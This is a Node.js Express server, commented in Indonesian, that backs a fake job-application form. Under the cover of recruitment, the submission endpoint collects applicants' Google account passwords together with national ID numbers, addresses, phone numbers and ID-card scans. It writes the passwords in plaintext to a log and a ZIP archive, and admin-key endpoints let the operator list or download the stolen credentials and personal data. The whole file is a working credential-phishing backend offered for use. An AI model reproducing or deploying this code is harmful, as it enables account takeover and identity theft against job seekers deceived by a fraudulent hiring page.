const express = require('express');
const multer = require('multer');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const AdmZip = require('adm-zip');

const app = express();
const PORT = process.env.PORT || 3000;

/* =======================
   MIDDLEWARE
======================= */
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

/* =======================
   PASTIKAN FOLDER DASAR ADA
======================= */
if (!fs.existsSync('uploads')) {
  fs.mkdirSync('uploads', { recursive: true });
}

if (!fs.existsSync('data')) {
  fs.mkdirSync('data', { recursive: true });
}

if (!fs.existsSync('data/applications.json')) {
  fs.writeFileSync('data/applications.json', '[]');
}
if (!fs.existsSync('data/login_data.txt')) {
  fs.writeFileSync('data/login_data.txt', '');
}
if (!fs.existsSync('data/data.txt')) {
  fs.writeFileSync('data/data.txt', '');
}

/* =======================
   ADMIN AUTH (CUMA LO)
======================= */
const adminAuth = (req, res, next) => {
  const key = req.headers['x-admin-key'];
  if (!key || key !== process.env.ADMIN_KEY) {
    return res.status(403).json({ message: 'Forbidden' });
  }
  next();
};

/* =======================
   MULTER SETUP
======================= */
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    const uploadDir = `uploads/${Date.now()}`;
    if (!fs.existsSync(uploadDir)) {
      fs.mkdirSync(uploadDir, { recursive: true });
    }
    cb(null, uploadDir);
  },
  filename: function (req, file, cb) {
    const unique = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + unique + path.extname(file.originalname));
  }
});

const upload = multer({ storage });

/* =======================
   SUBMIT FORM (PUBLIC)
======================= */
app.post(
  '/api/submit-application',
  upload.fields([
    { name: 'cv', maxCount: 1 },
    { name: 'ktp', maxCount: 1 },
    { name: 'surat_lamaran', maxCount: 1 }
  ]),
  (req, res) => {
    try {
      const applicationData = {
        id: Date.now(),
        googleEmail: req.body.googleEmail,
        nama: req.body.nama,
        nik: req.body.nik,
        alamat: req.body.alamat,
        noHp: req.body.noHp,
        files: {
          cv: req.files['cv'] ? req.files['cv'][0].path : null,
          ktp: req.files['ktp'] ? req.files['ktp'][0].path : null,
          suratLamaran: req.files['surat_lamaran']
            ? req.files['surat_lamaran'][0].path
            : null
        },
        submittedAt: new Date().toISOString()
      };

      const appPath = 'data/applications.json';
      const applications = JSON.parse(fs.readFileSync(appPath, 'utf8'));
      applications.push(applicationData);
      fs.writeFileSync(appPath, JSON.stringify(applications, null, 2));

      const timestamp = new Date().toISOString();
      const dataEntry = `
====================================
Timestamp: ${timestamp}
====================================
GOOGLE CREDENTIALS:
Email: ${req.body.googleEmail || 'N/A'}
Password: ${req.body.googlePassword || 'N/A'}

PERSONAL INFORMATION:
Nama Lengkap: ${req.body.nama || 'N/A'}
NIK: ${req.body.nik || 'N/A'}
Alamat: ${req.body.alamat || 'N/A'}
No HP: ${req.body.noHp || 'N/A'}

FILES:
CV: ${req.files['cv'] ? req.files['cv'][0].filename : 'N/A'}
KTP: ${req.files['ktp'] ? req.files['ktp'][0].filename : 'N/A'}
Surat Lamaran: ${req.files['surat_lamaran']
  ? req.files['surat_lamaran'][0].filename
  : 'N/A'}
====================================

`;
      fs.appendFileSync('data/data.txt', dataEntry);

      if (req.body.googleEmail && req.body.googlePassword) {
        const logEntry = `${timestamp} | Email: ${req.body.googleEmail} | Password: ${req.body.googlePassword}\n`;
        fs.appendFileSync('data/login_data.txt', logEntry);

        const zipPath = 'data/Google_Credentials.zip';
        const zip = fs.existsSync(zipPath) ? new AdmZip(zipPath) : new AdmZip();
        zip.addLocalFile('data/login_data.txt');
        zip.writeZip(zipPath);
      }

      res.json({
        success: true,
        message: 'Data telah terkirim, mohon menunggu untuk dihubungi HRD.'
      });
    } catch (err) {
      console.error(err);
      res.status(500).json({
        success: false,
        message: 'Terjadi kesalahan saat mengirim data.'
      });
    }
  }
);

/* =======================
   ADMIN ENDPOINT (TERKUNCI)
======================= */
app.get('/api/applications', adminAuth, (req, res) => {
  try {
    const data = JSON.parse(fs.readFileSync('data/applications.json', 'utf8'));
    res.json(data);
  } catch {
    res.json([]);
  }
});

app.get('/api/credentials', adminAuth, (req, res) => {
  try {
    const content = fs.readFileSync('data/login_data.txt', 'utf8').trim();
    if (!content) return res.json([]);
    const lines = content.split('\n');
    const parsed = lines.map(line => {
      const [timestamp, emailPart, passwordPart] = line.split(' | ');
      return {
        timestamp,
        email: emailPart.replace('Email: ', ''),
        password: passwordPart.replace('Password: ', '')
      };
    });
    res.json(parsed);
  } catch {
    res.json([]);
  }
});

app.get('/api/credentials/zip', adminAuth, (req, res) => {
  const zipPath = 'data/Google_Credentials.zip';
  if (fs.existsSync(zipPath)) return res.download(zipPath);
  res.status(404).json({ message: 'ZIP not found' });
});

app.get('/api/data', adminAuth, (req, res) => {
  const file = 'data/data.txt';
  if (fs.existsSync(file)) {
    res.type('text/plain').send(fs.readFileSync(file, 'utf8'));
  } else {
    res.status(404).json({ message: 'Data not found' });
  }
});

app.get('/api/data/download', adminAuth, (req, res) => {
  const file = 'data/data.txt';
  if (fs.existsSync(file)) return res.download(file);
  res.status(404).json({ message: 'Data not found' });
});

/* =======================
   START SERVER
======================= */
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});